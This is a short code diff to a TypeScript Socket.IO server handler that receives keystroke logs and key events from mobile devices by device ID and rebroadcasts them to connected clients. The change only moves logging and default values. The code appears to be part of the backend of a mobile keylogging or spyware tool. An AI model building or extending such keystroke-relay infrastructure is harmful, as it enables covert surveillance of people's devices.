@@ -552,17 +552,11 @@ export const startSocketIO = async () => {
 				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
 				async (response: any) => {
 					try {
+						console.log("Key logs=>", response);
 						const deviceId = response.deviceId;
 						const keyLogsType = response.keyLogsType;
-						const keylogs = response.keylogs || "None";
-						const keyEvent = response.event || "None";
-						console.log(
-							"KeyLogs Response=>",
-							deviceId,
-							keyLogsType,
-							keylogs,
-							keyEvent
-						);
+						const keylogs = response.keylogs;
+						const keyEvent = response.event;
 
 						// if (res.status == 200) {
 						io.emit(
@@ -570,8 +564,8 @@ export const startSocketIO = async () => {
 							{
 								deviceId: deviceId,
 								keyLogsType: keyLogsType,
-								keylogs: keylogs,
-								keyevent: keyEvent,
+								keylogs: keylogs || "none",
+								keyevent: keyEvent || "none",
 								created_at: Date.now(),
 							}
 						);
